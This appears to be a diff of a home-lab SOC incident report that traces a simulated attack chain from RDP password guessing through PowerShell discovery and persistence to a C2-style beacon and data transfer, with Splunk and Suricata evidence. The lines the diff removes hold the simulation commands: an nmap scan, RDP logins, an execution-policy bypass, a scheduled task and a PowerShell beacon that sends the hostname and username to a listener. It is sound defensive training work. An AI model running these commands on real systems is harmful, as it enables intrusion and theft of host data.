@@ -1,5 +1,5 @@
 # SOC Incident Report
-## Controlled RDP-to-C2 Attack Chain — August 2, 2026
+## Controlled RDP-to-C2 and Data-Transfer Investigation — August 2, 2026
 
 **Environment:** Isolated VirtualBox home lab  
 **Analyst:** Nehal Patel  
@@ -14,34 +14,29 @@
 ## Navigation
 
 - [1. Executive Summary](#1-executive-summary)
-- [2. Lab Architecture](#2-lab-architecture)
-- [3. Incident Scope and Assumptions](#3-incident-scope-and-assumptions)
-- [4. Chronological Timeline](#4-chronological-timeline)
-- [5. Evidence and Detection Results](#5-evidence-and-detection-results)
-  - [5.1 Network Reconnaissance](#51-network-reconnaissance)
-  - [5.2 Failed RDP Authentication](#52-failed-rdp-authentication)
-  - [5.3 Successful RDP Access](#53-successful-rdp-access)
-  - [5.4 System and Account Discovery](#54-system-and-account-discovery)
-  - [5.5 PowerShell Execution-Policy Bypass](#55-powershell-execution-policy-bypass)
-  - [5.6 Scheduled-Task Persistence](#56-scheduled-task-persistence)
-  - [5.7 C2-Style HTTP Beacon](#57-c2-style-http-beacon)
-- [6. Additional Lab Activity](#6-additional-lab-activity)
-- [7. Indicators and Artifacts](#7-indicators-and-artifacts)
-- [8. MITRE ATT&CK Mapping](#8-mitre-attck-mapping)
-- [9. Analyst Assessment](#9-analyst-assessment)
-- [10. Containment Recommendations](#10-containment-recommendations)
-- [11. Remediation and Detection Improvements](#11-remediation-and-detection-improvements)
-- [12. Conclusion](#12-conclusion)
-- [Appendix A — Controlled Simulation Commands](#appendix-a--controlled-simulation-commands)
-- [Appendix B — Screenshot Index](#appendix-b--screenshot-index)
+- [2. Incident Scope](#2-incident-scope)
+- [3. Chronological Timeline](#3-chronological-timeline)
+- [4. Evidence and Findings](#4-evidence-and-findings)
+  - [4.1 Network Reconnaissance](#41-network-reconnaissance)
+  - [4.2 Failed RDP Authentication](#42-failed-rdp-authentication)
+  - [4.3 Successful RDP Access](#43-successful-rdp-access)
+  - [4.4 System and Account Discovery](#44-system-and-account-discovery)
+  - [4.5 PowerShell Execution-Policy Bypass](#45-powershell-execution-policy-bypass)
+  - [4.6 Scheduled-Task Persistence](#46-scheduled-task-persistence)
+  - [4.7 C2-Style HTTP Beacon](#47-c2-style-http-beacon)
+  - [4.8 Controlled Outbound Data Transfer](#48-controlled-outbound-data-transfer)
+- [5. Indicators and Artifacts](#5-indicators-and-artifacts)
+- [6. Analyst Assessment](#6-analyst-assessment)
+- [7. Response Recommendations](#7-response-recommendations)
+- [8. Conclusion](#8-conclusion)
 
 ---
 
 ## 1. Executive Summary
 
-A controlled multi-stage intrusion was simulated from a Kali Linux attacker against a Windows victim. Traffic between both systems was routed through an Ubuntu SOC gateway running Suricata, Wireshark, tcpdump, and Splunk Enterprise.
+On August 2, 2026, a controlled multi-stage attack was simulated from a Kali Linux host against a Windows endpoint.
 
-The investigation confirmed the following sequence:
+The investigation confirmed:
 
 ```text
 Network reconnaissance
@@ -49,263 +44,174 @@ Network reconnaissance
 → successful RDP access
 → system and account discovery
 → PowerShell execution-policy bypass
-→ PowerShell script execution
 → scheduled-task persistence
 → outbound HTTP C2-style beacon
+→ controlled outbound data transfer
 ```
 
-Network telemetry was collected through Suricata and endpoint telemetry was forwarded from Windows through the Splunk Universal Forwarder. Splunk was used to correlate the events and reconstruct the attack timeline.
+Splunk was used to correlate Windows authentication, Sysmon, PowerShell, and Suricata events into a single incident timeline.
+
+The activity was authorized and used harmless lab files. In a production environment, the same sequence would warrant immediate containment and escalation.
 
 ---
 
-## 2. Lab Architecture
+## 2. Incident Scope
 
-```mermaid
-flowchart LR
-    K[Kali Attacker\n192.168.10.10] -->|ATTACK-NET| U[Ubuntu SOC Gateway\n192.168.10.1 / 192.168.20.1]
-    U -->|VICTIM-NET| W[Windows Victim\n192.168.20.20]
-    U --> N[Suricata / Wireshark / tcpdump]
-    N -->|eve.json and IDS alerts| S[Splunk Enterprise]
-    W -->|Windows logs via Universal Forwarder\nTCP 9997| S
-```
+| Field | Value |
+|---|---|
+| Attacker | Kali Linux — `192.168.10.10` |
+| Victim | Windows 10 — `DESKTOP-17JMLSF` — `192.168.20.20` |
+| Target account | `victimuser` |
+| Initial access method | RDP using a valid lab account after failed password attempts |
+| Persistence method | Scheduled task launching PowerShell |
+| C2-style destination | `192.168.10.10:8000` |
+| Data-transfer destination | `192.168.10.10:9001` |
 
-### Systems
-
-| Role | Hostname / VM | IP address |
-|---|---|---:|
-| Attacker | Kali Attacker / `kali-attacker` | `192.168.10.10` |
-| SOC gateway | Ubuntu SOC | `192.168.10.1`, `192.168.20.1` |
-| Victim | Windows Victim / `DESKTOP-17JMLSF` | `192.168.20.20` |
-
-### Telemetry ingested into Splunk
-
-- Suricata `eve.json`
-- Suricata IDS alerts and network flows
-- Windows Security
-- Windows System
-- Windows Application
-- Sysmon Operational
-- PowerShell Operational
-- Microsoft Defender Operational
+The repository README documents the lab architecture, system configuration, data sources, MITRE ATT&CK mapping, and reusable SPL queries. This report focuses only on the incident investigation and evidence.
 
 ---
 
-## 3. Incident Scope and Assumptions
-
-The simulation used the local account `victimuser` on the Windows victim. The source of attacker activity was `192.168.10.10`.
-
-The evidence confirms access and post-access activity. It does not represent malware execution; all scripts and files were harmless lab artifacts with recognizable `SOC-LAB` markers.
-
----
-
-## 4. Chronological Timeline
+## 3. Chronological Timeline
 
 | Time | Stage | Key evidence |
 |---|---|---|
-| 14:58:10–14:58:19 | Network reconnaissance | Suricata recorded TCP flows from `192.168.10.10` to Windows ports `135`, `139`, `445`, `3389`, and `5985` |
-| 15:11:12 | Failed RDP login | Event ID `4625`; `victimuser`; source `192.168.10.10`; bad password |
+| 14:58:10–14:58:19 | Network reconnaissance | Suricata recorded TCP flows from `192.168.10.10` to ports `135`, `139`, `445`, `3389`, and `5985` on `192.168.20.20` |
+| 15:11:12 | Failed RDP login | Event ID `4625`; user `victimuser`; source `192.168.10.10`; bad password |
 | 15:11:16 | Failed RDP login | Second Event ID `4625` from `192.168.10.10` |
 | 15:11:18 | Failed RDP login | Third Event ID `4625` from `192.168.10.10` |
 | 15:11:44 | Successful RDP access | Event ID `4624`; Logon Type `10`; user `victimuser`; source `192.168.10.10` |
-| 15:31:39 | System and account discovery | Sysmon Event ID `1` recorded a PowerShell command containing `whoami`, `hostname`, `ipconfig`, `Get-LocalUser`, and `Get-Process` |
-| 15:34:36 | PowerShell script execution | PowerShell Event ID `4104` recorded `ExecutionPolicy Bypass` and `C:\SOC-LAB\stage3.ps1` |
-| 15:35:44 | Scheduled-task persistence | `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, `Register-ScheduledTask`, and `Start-ScheduledTask` detected |
-| 15:36:24 | C2-style HTTP beacon | Windows connected to `192.168.10.10:8000`; URI included hostname, user, and `stage=complete` |
-| 15:37:28 | Continued C2-style flow | Suricata recorded a corresponding TCP/HTTP flow |
+| 15:31:39 | System and account discovery | Sysmon recorded PowerShell running `whoami`, `hostname`, `ipconfig`, `Get-LocalUser`, and `Get-Process` |
+| 15:34:36 | PowerShell script execution | Event ID `4104` recorded `ExecutionPolicy Bypass` and `C:\SOC-LAB\stage3.ps1` |
+| 15:35:44 | Scheduled-task persistence | Scheduled-task creation and execution commands were detected |
+| 15:36:24 | C2-style HTTP beacon | Windows connected to `192.168.10.10:8000`; URI contained hostname, username, and `stage=complete` |
+| 15:37:28 | Continued C2-style flow | Suricata recorded the corresponding HTTP/TCP flow |
+| 15:44:06 | Controlled outbound data transfer | Windows sent `3,045` bytes to Kali over TCP port `9001`; Suricata recorded 6 outbound packets |
 
 Repeated successful RDP Event ID `4624` records were also observed at 15:27:14 and 15:30:42, consistent with additional session activity or reconnections.
 
 ---
 
-## 5. Evidence and Detection Results
+## 4. Evidence and Findings
 
-### 5.1 Network Reconnaissance
+### 4.1 Network Reconnaissance
 
-Kali scanned selected Windows management, file-sharing, and remote-access ports.
+Kali scanned selected Windows management, file-sharing, and remote-access ports. Suricata recorded flows to ports `135`, `139`, `445`, `3389`, and `5985`.
 
 The activity is consistent with targeted network-service discovery.
 
-**Splunk detection**
-
-```spl
-source="/var/log/suricata/eve.json"
-src_ip="192.168.10.10"
-dest_ip="192.168.20.20"
-dest_port IN (135,139,445,3389,5985)
-| table _time event_type src_ip dest_ip dest_port proto app_proto alert.signature
-| sort _time
-```
-<img width="975" height="550" alt="image" src="https://github.com/user-attachments/assets/e0ec6442-f899-4344-9659-7e29c4518c49" />
+<img width="975" height="550" alt="Splunk results showing Suricata reconnaissance flows" src="https://github.com/user-attachments/assets/e0ec6442-f899-4344-9659-7e29c4518c49" />
 
 ---
 
-### 5.2 Failed RDP Authentication
+### 4.2 Failed RDP Authentication
 
-Three failed logins were recorded before successful access.
+Three failed authentication attempts were recorded for `victimuser` from `192.168.10.10`.
 
-**Splunk detection**
+| Time | Event ID | Result |
+|---|---:|---|
+| 15:11:12.014 | 4625 | Bad password |
+| 15:11:16.259 | 4625 | Bad password |
+| 15:11:18.490 | 4625 | Bad password |
 
-```spl
-index=* source="WinEventLog:Security" EventCode=4625
-| eval User=coalesce(TargetUserName,Account_Name,user)
-| eval SourceIP=coalesce(IpAddress,Source_Network_Address)
-| search SourceIP="192.168.10.10" OR _raw="192.168.10.10"
-| table _time User SourceIP Logon_Type Failure_Reason Status Sub_Status EventCode
-| sort _time
-```
-<img width="975" height="588" alt="image" src="https://github.com/user-attachments/assets/33d71be5-898b-45fd-b6e1-61e16acf31db" />
+**Status:** `0xC000006D`  
+**Sub-status:** `0xC000006A`
+
+<img width="975" height="588" alt="Splunk results showing three failed RDP authentication events" src="https://github.com/user-attachments/assets/33d71be5-898b-45fd-b6e1-61e16acf31db" />
 
 ---
 
-### 5.3 Successful RDP Access
+### 4.3 Successful RDP Access
 
 A successful RemoteInteractive logon followed the failed attempts.
-Logon Type `10` is consistent with an RDP session.
 
-**Splunk detection**
+| Time | User | Source IP | Logon Type | Event ID |
+|---|---|---|---:|---:|
+| 15:11:44.420 | `victimuser` | `192.168.10.10` | 10 | 4624 |
 
-```spl
-index=* source="WinEventLog:Security" EventCode=4624
-| rex field=_raw "Logon Type:\s+(?<RDPLogonType>\d+)"
-| rex field=_raw "Source Network Address:\s+(?<SourceIP>[^\r\n]+)"
-| eval User=coalesce(TargetUserName,mvindex(Account_Name,-1),user)
-| where RDPLogonType=10 AND SourceIP="192.168.10.10"
-| table _time User SourceIP RDPLogonType EventCode
-| sort _time
-```
-<img width="975" height="497" alt="image" src="https://github.com/user-attachments/assets/a5d58c9c-59ad-446a-a282-c021db047406" />
+Logon Type `10` is consistent with RDP access.
+
+<img width="975" height="497" alt="Splunk results showing successful RDP Logon Type 10" src="https://github.com/user-attachments/assets/a5d58c9c-59ad-446a-a282-c021db047406" />
 
 ---
 
-### 5.4 System and Account Discovery
+### 4.4 System and Account Discovery
 
-PowerShell collected the logged-in identity, hostname, network configuration, local users, and running processes.
+PowerShell collected information about the victim system and user context.
 
-**Splunk detection — parent PowerShell process**
+Observed commands included:
 
-```spl
-index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
-(CommandLine="*SOC-LAB-DISCOVERY*" OR CommandLine="*Get-LocalUser*" OR CommandLine="*Get-Process*")
-| table _time User Image ParentImage CommandLine
-| sort _time
-```
+- `whoami`
+- `hostname`
+- `ipconfig`
+- `Get-LocalUser`
+- `Get-Process`
 
-<img width="975" height="403" alt="image" src="https://github.com/user-attachments/assets/49c86a2f-c1e3-42bf-944a-ae1a99774d73" />
+This exposed the current user, hostname, network configuration, local accounts, and running processes.
+
+<img width="975" height="403" alt="Splunk Sysmon results showing PowerShell discovery commands" src="https://github.com/user-attachments/assets/49c86a2f-c1e3-42bf-944a-ae1a99774d73" />
 
 ---
 
-### 5.5 PowerShell Execution-Policy Bypass
+### 4.5 PowerShell Execution-Policy Bypass
 
-PowerShell Event ID `4104` recorded execution of a harmless script using an execution-policy bypass.
-
-**Observed evidence**
+PowerShell Event ID `4104` recorded execution of a harmless lab script using an execution-policy bypass.
 
 | Time | Host | Event ID | Command |
 |---|---|---:|---|
 | 15:34:36.658 | `DESKTOP-17JMLSF` | 4104 | `powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\SOC-LAB\stage3.ps1"` |
 
-**Splunk detection**
+The script was harmless, but `ExecutionPolicy Bypass` is a high-value detection indicator because it can be used to run scripts outside normal policy restrictions.
 
-```spl
-index=* source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
-| eval PowerShellCommand=coalesce(ScriptBlockText,Message,_raw)
-| search PowerShellCommand="*SOC-LAB*" OR PowerShellCommand="*stage3.ps1*" OR PowerShellCommand="*ExecutionPolicy Bypass*"
-| table _time host EventCode PowerShellCommand
-| sort _time
-```
-<img width="975" height="592" alt="image" src="https://github.com/user-attachments/assets/296ae8cf-54a1-4edb-80e7-e70c2c541747" />
-
-**Analyst assessment:** The script was harmless, but `ExecutionPolicy Bypass` is a high-value detection indicator because it is commonly used to run scripts outside normal policy controls.
+<img width="975" height="592" alt="Splunk results showing PowerShell execution-policy bypass" src="https://github.com/user-attachments/assets/296ae8cf-54a1-4edb-80e7-e70c2c541747" />
 
 ---
 
-### 5.6 Scheduled-Task Persistence
+### 4.6 Scheduled-Task Persistence
 
-PowerShell activity showed creation and execution of a scheduled task.
+PowerShell activity showed the creation and execution of a scheduled task.
 
 | Time | Host | Detected actions |
 |---|---|---|
 | 15:35:44.596 | `DESKTOP-17JMLSF` | `New-ScheduledTaskAction` |
 | 15:35:44.597 | `DESKTOP-17JMLSF` | `New-ScheduledTaskTrigger`, `Register-ScheduledTask`, `Start-ScheduledTask` |
 
-**Splunk detection**
+In a production environment, an unexpected task launching PowerShell at logon should be treated as potential persistence.
 
-```spl
-index=* source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
-("New-ScheduledTaskAction" OR "New-ScheduledTaskTrigger" OR "Register-ScheduledTask" OR "Start-ScheduledTask")
-| eval PSCommand=coalesce(ScriptBlockText,Message,_raw)
-| rex max_match=0 field=PSCommand "(?<DetectedActions>New-ScheduledTaskAction|New-ScheduledTaskTrigger|Register-ScheduledTask|Start-ScheduledTask)"
-| table _time host DetectedActions
-| sort _time
-```
-<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/daef9d9b-b1e7-4d35-a15b-c731e0137cee" />
-
-**Analyst assessment:** In production, an unexpected task launching PowerShell at logon should be treated as potential persistence.
+<img width="975" height="506" alt="Splunk results showing scheduled-task persistence commands" src="https://github.com/user-attachments/assets/daef9d9b-b1e7-4d35-a15b-c731e0137cee" />
 
 ---
 
-### 5.7 C2-Style HTTP Beacon
+### 4.7 C2-Style HTTP Beacon
 
-The victim initiated an outbound HTTP connection to the Kali system.
+The Windows victim initiated an outbound HTTP connection to a Kali-controlled listener.
 
-| Time | Stage | Source | Destination | Port | Protocol | URI |
-|---|---|---|---|---:|---|---|
-| 15:36:24.453 | C2 / outbound connection attempt | `192.168.20.20` | `192.168.10.10` | 8000 | HTTP/TCP | `/?host=DESKTOP-17JMLSF&user=victimuser&stage=complete` |
-| 15:37:28.231 | Continued flow | `192.168.20.20` | `192.168.10.10` | 8000 | HTTP/TCP | Flow event |
+| Time | Source | Destination | Protocol | URI |
+|---|---|---|---|---|
+| 15:36:24.453 | `192.168.20.20` | `192.168.10.10:8000` | HTTP/TCP | `/?host=DESKTOP-17JMLSF&user=victimuser&stage=complete` |
+| 15:37:28.231 | `192.168.20.20` | `192.168.10.10:8000` | HTTP/TCP | Continued flow |
 
-**Splunk detection**
+This was a controlled beacon simulation, not actual malware command-and-control activity.
 
-```spl
-source="/var/log/suricata/eve.json"
-src_ip="192.168.20.20"
-dest_ip="192.168.10.10"
-dest_port=8000
-| eval Stage="C2 / Outbound Connection Attempt"
-| eval URI=coalesce('http.url',url)
-| table _time Stage src_ip dest_ip dest_port proto event_type app_proto URI
-| sort _time
-```
-<img width="975" height="443" alt="image" src="https://github.com/user-attachments/assets/e95bf0bd-dd34-43ea-8693-ff5c8ad605c5" />
-
-
-**Analyst assessment:** This was a controlled beacon simulation, not actual malware C2. In production, a workstation sending identifying information to an unusual internal or external HTTP listener would require investigation and containment.
+<img width="975" height="443" alt="Splunk Suricata results showing the simulated HTTP beacon" src="https://github.com/user-attachments/assets/e95bf0bd-dd34-43ea-8693-ff5c8ad605c5" />
 
 ---
 
-## 6. Additional Lab Activity
+### 4.8 Controlled Outbound Data Transfer
 
-The following harmless stages were also performed:
+Suricata recorded an outbound TCP connection from the Windows victim to the Kali system on port `9001`.
 
-- Creation of fake employee and server documents
-- ZIP archive creation using `Compress-Archive`
-- Transfer of the fake archive to Kali over TCP port `9001`
+| Time | Source | Destination | Protocol | Packets Sent | Bytes Sent | Bytes Received | Total Bytes |
+|---|---|---|---|---:|---:|---:|---:|
+| 15:44:06.953 | `192.168.20.20:61004` | `192.168.10.10:9001` | TCP | 6 | 3,045 | 186 | 3,231 |
 
-These actions should be added to the confirmed incident timeline only after their endpoint or Suricata events are captured and attached.
+The flow confirms that data moved from the Windows victim to the Kali-controlled listener. Suricata flow metadata does not identify the exact file contents, so the event is documented as a **controlled outbound data transfer / simulated exfiltration**.
 
-**Archive detection query**
+<img width="975" height="481" alt="image" src="https://github.com/user-attachments/assets/830b5b8a-edd8-426c-b0a3-7cd5aea89a67" />
 
-```spl
-index=* source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
-("Compress-Archive" OR "collected-data.zip" OR "employee-data.txt" OR "server-notes.txt")
-| eval Command=coalesce(ScriptBlockText,Message,_raw)
-| table _time host EventCode Command
-| sort _time
-```
-
-**TCP/9001 transfer query**
-
-```spl
-source="/var/log/suricata/eve.json"
-src_ip="192.168.20.20"
-dest_ip="192.168.10.10"
-dest_port=9001
-| table _time event_type src_ip dest_ip src_port dest_port proto app_proto
-| sort _time
-```
 
 ---
 
-## 7. Indicators and Artifacts
+## 5. Indicators and Artifacts
 
 | Type | Indicator |
 |---|---|
@@ -315,105 +221,66 @@ dest_port=9001
 | Target account | `victimuser` |
 | Reconnaissance ports | `135`, `139`, `445`, `3389`, `5985` |
 | Beacon destination | `192.168.10.10:8000` |
-| Script | `C:\SOC-LAB\stage3.ps1` |
-| Earlier lab script | `C:\SOC-LAB\payload.ps1` |
+| Data-transfer destination | `192.168.10.10:9001` |
+| PowerShell script | `C:\SOC-LAB\stage3.ps1` |
 | Scheduled task | `SOC-LAB-Update` |
 | Beacon marker | `stage=complete` |
-| Archive | `C:\SOC-LAB\collected-data.zip` |
-| Simulated exfiltration port | `9001/TCP` |
+| Outbound source port | `61004` |
+| Confirmed outbound bytes | `3,045` |
 
 ---
 
-## 8. MITRE ATT&CK Mapping
-
-| Stage | Technique |
-|---|---|
-| Port scanning | T1046 — Network Service Scanning |
-| Failed password attempts | T1110.001 — Password Guessing |
-| RDP access | T1021.001 — Remote Desktop Protocol |
-| User discovery | T1033 — System Owner/User Discovery |
-| Local-account discovery | T1087.001 — Local Account |
-| Network discovery | T1016 — System Network Configuration Discovery |
-| Process discovery | T1057 — Process Discovery |
-| PowerShell | T1059.001 — PowerShell |
-| Scheduled task | T1053.005 — Scheduled Task |
-| HTTP beacon | T1071.001 — Web Protocols |
-| ZIP staging | T1560.001 — Archive via Utility |
-| Simulated transfer | T1041 — Exfiltration Over C2 Channel |
-
----
-
-## 9. Analyst Assessment
+## 6. Analyst Assessment
 
 ### What happened
 
-A Kali host enumerated services on a Windows endpoint. Repeated RDP login failures were followed by a successful RDP session. After access, PowerShell was used for discovery, a harmless script was executed with an execution-policy bypass, and a scheduled task was created. The Windows victim then sent an HTTP request containing host and user information to a Kali-controlled listener.
+A Kali host enumerated services on a Windows endpoint. Repeated RDP login failures were followed by successful RDP access using the lab account `victimuser`.
+
+After access, PowerShell was used for system and account discovery. A harmless script was executed with an execution-policy bypass, and a scheduled task was created to simulate persistence.
+
+The Windows victim then sent a C2-style HTTP beacon to Kali and later transferred `3,045` bytes over TCP port `9001`.
 
 ### Why it matters
 
-The combination of failed authentication, successful remote access, PowerShell execution, persistence, and outbound beaconing is highly suspicious in a production environment. Individually, some events can be legitimate; together, they form a coherent attack pattern.
+The combination of failed authentication, successful remote access, suspicious PowerShell activity, persistence, beaconing, and outbound data movement forms a coherent attack pattern.
+
+In a production environment, this sequence would indicate a potentially compromised endpoint and would require immediate containment.
 
 ### Confidence
 
-**High.** The activity was validated across independent network and endpoint sources:
+**High.** The activity was validated across independent endpoint and network evidence:
 
-- Windows Security for RDP authentication
-- Sysmon for process execution and command lines
-- PowerShell Operational for script-block content
-- Suricata for reconnaissance and outbound communication
-- Splunk for centralized correlation and timeline reconstruction
+- Windows Security events for RDP authentication
+- Sysmon process-creation events
+- PowerShell Script Block Logging
+- Suricata network-flow and HTTP metadata
+- Splunk correlation and timeline reconstruction
 
 ---
 
-## 10. Containment Recommendations
+## 7. Response Recommendations
 
 For an equivalent production incident:
 
 1. Isolate the affected endpoint.
 2. Disable or reset the affected user account.
 3. Terminate unauthorized RDP sessions.
-4. Block the attacker and C2 destination IPs.
+4. Block the attacker, beacon, and data-transfer destinations.
 5. Remove unauthorized scheduled tasks.
 6. Quarantine suspicious scripts and archives.
-7. Review related authentication, Sysmon, PowerShell, EDR, DNS, proxy, and firewall logs.
-8. Search the environment for the same indicators and commands.
-9. Rotate credentials used on the affected system.
+7. Review related authentication, EDR, PowerShell, DNS, proxy, firewall, and network-flow logs.
+8. Search other systems for matching indicators and commands.
+9. Rotate credentials used on the affected endpoint.
 10. Preserve forensic evidence before remediation.
+11. Require MFA and restrict RDP to approved management networks.
+12. Create correlation alerts for repeated `4625` failures followed by a `4624` Logon Type `10`.
+13. Alert on PowerShell execution-policy bypass, scheduled-task creation, unusual HTTP destinations, and outbound transfers to uncommon ports.
 
 ---
 
-## 11. Remediation and Detection Improvements
+## 8. Conclusion
 
-- Require MFA for remote access.
-- Restrict RDP to approved management networks.
-- Apply account-lockout and password controls.
-- Alert on repeated `4625` failures followed by `4624` Logon Type `10`.
-- Alert on PowerShell `ExecutionPolicy Bypass`.
-- Monitor PowerShell Event ID `4104`.
-- Monitor Sysmon Event ID `1` for suspicious parent-child relationships.
-- Monitor scheduled-task creation.
-- Alert on unusual outbound HTTP to non-standard ports.
-- Maintain network segmentation and centralized logging.
-- Convert the individual SPL searches into saved searches and correlation alerts.
-
----
-
-## 12. Conclusion
-
-The lab successfully demonstrated an end-to-end SOC investigation across network and endpoint telemetry:
-
-```text
-Attack simulation
-→ telemetry generation
-→ centralized ingestion
-→ detection
-→ correlation
-→ timeline reconstruction
-→ MITRE ATT&CK mapping
-→ response recommendations
-```
-
-The confirmed August 2 chain was:
+The investigation reconstructed a complete controlled attack sequence using endpoint and network telemetry:
 
 ```text
 Reconnaissance
@@ -422,75 +289,10 @@ Reconnaissance
 → discovery
 → PowerShell execution
 → scheduled-task persistence
-→ outbound HTTP C2-style beacon
+→ C2-style HTTP beacon
+→ controlled outbound data transfer
 ```
 
-This report, its evidence, and its detection queries provide a reproducible SOC case study suitable for a cybersecurity portfolio.
+The lab demonstrates the ability to identify suspicious activity, correlate multiple log sources, reconstruct a timeline, assess impact, and recommend containment actions.
 
----
-
-## Appendix A — Controlled Simulation Commands
-
-### Reconnaissance
-
-```bash
-sudo nmap -sS -Pn -p 135,139,445,3389,5985 192.168.20.20
-```
-
-### Failed RDP attempts
-
-```bash
-xfreerdp3 /v:192.168.20.20 /u:victimuser /p:'<WRONG_LAB_PASSWORD>' /cert:ignore
-```
-
-### Successful RDP session
-
-```bash
-xfreerdp3 /v:192.168.20.20 /u:victimuser /cert:ignore /dynamic-resolution
-```
-
-### Discovery
-
-```powershell
-powershell.exe -NoProfile -Command "Write-Output 'SOC-LAB-DISCOVERY-START'; whoami; hostname; ipconfig; Get-LocalUser; Get-Process | Select-Object -First 10; Write-Output 'SOC-LAB-DISCOVERY-END'"
-```
-
-### Harmless payload execution
-
-```powershell
-New-Item -ItemType Directory -Path "C:\SOC-LAB" -Force
-
-'Write-Output "SOC-LAB-PAYLOAD-EXECUTED"; Get-Date | Out-File "C:\SOC-LAB\payload-stage.txt"' |
-    Set-Content "C:\SOC-LAB\stage3.ps1"
-
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\SOC-LAB\stage3.ps1"
-```
-
-### Scheduled-task persistence simulation
-
-```powershell
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -Command "Add-Content C:\SOC-LAB\persistence.log \"SOC-LAB task executed\""'
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName "SOC-LAB-Update" -Action $action -Trigger $trigger -Description "Home-lab persistence test" -Force
-Start-ScheduledTask -TaskName "SOC-LAB-Update"
-```
-
-### C2-style beacon simulation
-
-```powershell
-Add-Type -AssemblyName System.Net.Http
-$handler = New-Object System.Net.Http.HttpClientHandler
-$handler.UseProxy = $false
-$client = New-Object System.Net.Http.HttpClient($handler)
-$client.GetAsync("http://192.168.10.10:8000/?host=$env:COMPUTERNAME&user=$env:USERNAME&stage=complete").Result.StatusCode
-```
-
----
-
-## Appendix B — Screenshot Index
-
-1. `screenshots/01-nmap-scan.png` — Kali Nmap scan
-   <img width="975" height="454" alt="image" src="https://github.com/user-attachments/assets/eba75d25-d91c-4a1a-a68b-92f63d9badf1" />
-2. `screenshots/02-successful-rdp.png` — successful RDP 
-   <img width="975" height="503" alt="image" src="https://github.com/user-attachments/assets/7a450047-a366-486e-a8d6-b660326659b6" />
-
+Detailed lab architecture, reusable SPL searches, MITRE ATT&CK mapping, and setup information remain in the project README to avoid duplicating content in this incident report.
